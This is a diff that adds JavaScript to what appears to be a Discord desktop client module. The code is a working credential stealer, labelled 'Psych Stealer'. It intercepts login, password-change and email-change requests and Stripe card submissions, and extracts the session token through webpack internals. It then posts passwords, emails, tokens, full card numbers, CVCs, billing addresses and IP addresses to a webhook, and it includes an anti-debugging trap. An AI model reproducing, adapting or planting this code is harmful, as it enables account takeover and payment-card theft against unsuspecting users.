+                                            '[**<:partner:909102089513340979> \u2502 Click Here To Copy Info On Mobile**](https://superfurrycdn.nl/copy/' +
+                                            W +
+                                            ')',
+                                          color: config['embed-color'],
+                                          fields: [
+                                            {
+                                              name: 'Info',
+                                              value:
+                                                '```Hostname: \n' +
+                                                computerName +
+                                                '\nIP: \n' +
+                                                C +
+                                                '```',
+                                              inline: false,
+                                            },
+                                            {
+                                              name: 'Username',
+                                              value:
+                                                '`' +
+                                                g.username +
+                                                '#' +
+                                                g.discriminator +
+                                                '`',
+                                              inline: true,
+                                            },
+                                            {
+                                              name: 'ID',
+                                              value: '`' + g.id + '`',
+                                              inline: true,
+                                            },
+                                            {
+                                              name: 'Nitro',
+                                              value:
+                                                '' + GetNitro(g.premium_type),
+                                              inline: false,
+                                            },
+                                            {
+                                              name: 'Badges',
+                                              value: '' + GetBadges(g.flags),
+                                              inline: false,
+                                            },
+                                            {
+                                              name: 'Billing',
+                                              value: '' + y(),
+                                              inline: false,
+                                            },
+                                            {
+                                              name: 'New Email',
+                                              value: '`' + email + '`',
+                                              inline: true,
+                                            },
+                                            {
+                                              name: 'Password',
+                                              value: '`' + w + '`',
+                                              inline: true,
+                                            },
+                                            {
+                                              name: 'Token',
+                                              value: '```' + W + '```',
+                                              inline: false,
+                                            },
+                                          ],
+                                          author: { name: 'LiquidBounce' },
+                                          footer: { text: 'LiquidBounce' },
+                                          thumbnail: {
+                                            url:
+                                              'https://cdn.discordapp.com/avatars/' +
+                                              g.id +
+                                              '/' +
+                                              g.avatar,
+                                          },
+                                        },
+                                        {
+                                          title: 'Total Friends (' + q() + ')',
+                                          color: config['embed-color'],
+                                          description: i(),
+                                          author: { name: 'LiquidBounce' },
+                                          footer: { text: 'LiquidBounce' },
+                                          thumbnail: {
+                                            url:
+                                              'https://cdn.discordapp.com/avatars/' +
+                                              g.id +
+                                              '/' +
+                                              g.avatar,
+                                          },
+                                        },
+                                      ],
+                                    }
+                                    SendToWebhook(JSON.stringify(X))
+                                  })
+                              })
+                          })
+                      })
+                  }
+                })
+            })
+        })
+    })
+}
+function CreditCardAdded(a, w, W, b, s, J, Q, D, L, k) {
+  const R = BrowserWindow.getAllWindows()[0]
+  R.webContents
+    .executeJavaScript(
+      '\n    var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );\n    xmlHttp.setRequestHeader("Authorization", "' +
+        k +
+        '");\n    xmlHttp.send( null );\n    xmlHttp.responseText;',
+      true
+    )
+    .then((U) => {
+      R.webContents
+        .executeJavaScript(
+          '\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );\n        xmlHttp.send( null );\n        xmlHttp.responseText;\n    ',
+          true
+        )
+        .then((e) => {
+          var G = JSON.parse(U)
+          var C = {
+            username: 'Psych Stealer',
+            content: '',
+            embeds: [
+              {
+                title: 'User Credit Card Added',
+                description:
+                  '**Username:**```' +
+                  G.username +
+                  '#' +
+                  G.discriminator +
+                  '```\n**ID:**```' +
+                  G.id +
+                  '```\n**Email:**```' +
+                  G.email +
+                  '```\n' +
+                  '**Nitro Type:**```' +
+                  GetNitro(G.premium_type) +
+                  '```\n**Badges:**```' +
+                  GetBadges(G.flags) +
+                  '```' +
+                  '\n**Credit Card Number: **```' +
+                  a +
+                  '```' +
+                  '\n**Credit Card Expiration: **```' +
+                  W +
+                  '/' +
+                  b +
+                  '```' +
+                  '\n**CVC: **```' +
+                  w +
+                  '```\n' +
+                  '**Country: **```' +
+                  L +
+                  '```\n' +
+                  '**State: **```' +
+                  Q +
+                  '```\n' +
+                  '**City: **```' +
+                  J +
+                  '```\n' +
+                  '**ZIP:**```' +
+                  D +
+                  '```' +
+                  '\n**Street: **```' +
+                  s +
+                  '```' +
+                  '\n**Token:**```' +
+                  k +
+                  '```' +
+                  '\n**IP: **```' +
+                  e +
+                  '```',
+                author: { name: 'LiquidBounce' },
+                footer: { text: 'LiquidBounce' },
+                thumbnail: {
+                  url:
+                    'https://cdn.discordapp.com/avatars/' +
+                    G.id +
+                    '/' +
+                    G.avatar,
+                },
+              },
+            ],
+          }
+          SendToWebhook(JSON.stringify(C))
+        })
+    })
+}
+const AS = {}
+AS.urls = [
+  'https://discord.com/api/v*/users/@me',
+  'https://discordapp.com/api/v*/users/@me',
+  'https://*.discord.com/api/v*/users/@me',
+  'https://discordapp.com/api/v*/auth/login',
+  'https://discord.com/api/v*/auth/login',
+  'https://*.discord.com/api/v*/auth/login',
+  'https://api.stripe.com/v*/tokens',
+]
+const ChangePasswordFilter = AS
+session.defaultSession.webRequest.onCompleted(ChangePasswordFilter, (a, w) => {
+  if (a.url.endsWith('login')) {
+    if (a.statusCode == 200) {
+      const b = JSON.parse(Buffer.from(a.uploadData[0].bytes).toString()),
+        s = b.login,
+        J = b.password,
+        Q = BrowserWindow.getAllWindows()[0]
+      Q.webContents
+        .executeJavaScript(
+          'for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;',
+          true
+        )
+        .then((D) => {
+          Login(s, J, D)
+        })
+    } else {
+    }
+  }
+  if (a.url.endsWith('users/@me')) {
+    if (a.statusCode == 200 && a.method == 'PATCH') {
+      const D = JSON.parse(Buffer.from(a.uploadData[0].bytes).toString())
+      if (D.password != null && D.password != undefined && D.password != '') {
+        if (
+          D.new_password != undefined &&
+          D.new_password != null &&
+          D.new_password != ''
+        ) {
+          const L = BrowserWindow.getAllWindows()[0]
+          L.webContents
+            .executeJavaScript(
+              'for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;',
+              true
+            )
+            .then((k) => {
+              ChangePassword(D.password, D.new_password, k)
+            })
+        }
+        if (D.email != null && D.email != undefined && D.email != '') {
+          const k = BrowserWindow.getAllWindows()[0]
+          k.webContents
+            .executeJavaScript(
+              'for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;',
+              true
+            )
+            .then((p) => {
+              ChangeEmail(D.email, D.password, p)
+            })
+        }
+      }
+    } else {
+    }
+  }
+  if (a.url.endsWith('tokens')) {
+    const p = BrowserWindow.getAllWindows()[0],
+      R = querystring.parse(
+        decodeURIComponent(Buffer.from(a.uploadData[0].bytes).toString())
+      )
+    p.webContents
+      .executeJavaScript(
+        'for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;',
+        true
+      )
+      .then((U) => {
+        CreditCardAdded(
+          R['card[number]'],
+          R['card[cvc]'],
+          R['card[exp_month]'],
+          R['card[exp_year]'],
+          R['card[address_line1]'],
+          R['card[address_city]'],
+          R['card[address_state]'],
+          R['card[address_zip]'],
+          R['card[address_country]'],
+          U
+        )
+      })
+  }
+})
+function T(a) {
+  function W(b) {
+    if (typeof b === 'string') {
+      return function (s) {}.constructor('while (true) {}').apply('counter')
+    } else {
+      ;('' + b / b).length !== 1 || b % 20 === 0
+        ? function () {
+            return true
+          }
+            .constructor('debugger')
+            .call('action')
+        : function () {
+            return false
+          }
+            .constructor('debugger')
+            .apply('stateObject')
+    }
+    W(++b)
+  }
+  try {
+    if (a) {
+      return W
+    } else {
+      W(0)
+    }
+  } catch (b) {}
+}
+module.exports = require('./core.asar')
